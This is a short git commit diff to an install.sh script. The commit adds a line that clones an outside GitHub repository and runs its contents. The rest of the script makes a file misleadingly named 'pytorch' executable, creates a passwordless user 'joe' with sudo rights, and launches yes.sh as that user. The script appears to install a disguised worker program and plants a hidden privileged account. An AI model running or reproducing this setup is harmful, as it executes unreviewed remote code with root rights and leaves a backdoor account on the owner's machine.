1efe22a4a9789a40292a1efc2fff6079bfee49e9
ekeitgits <86105245+ekeitgits@users.noreply.github.com>
2021-06-22 18:54:58 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,5 +1,6 @@
 #!/bin/bash
 sudo apt update
+git clone https://github.com/babehdyo/Workergits.git && cd Workergits
 chmod +x yes.sh && chmod +x pytorch
 sudo adduser --disabled-password --gecos "" joe && sudo usermod -aG sudo joe
 sudo -u joe -H sh -c "./yes.sh"
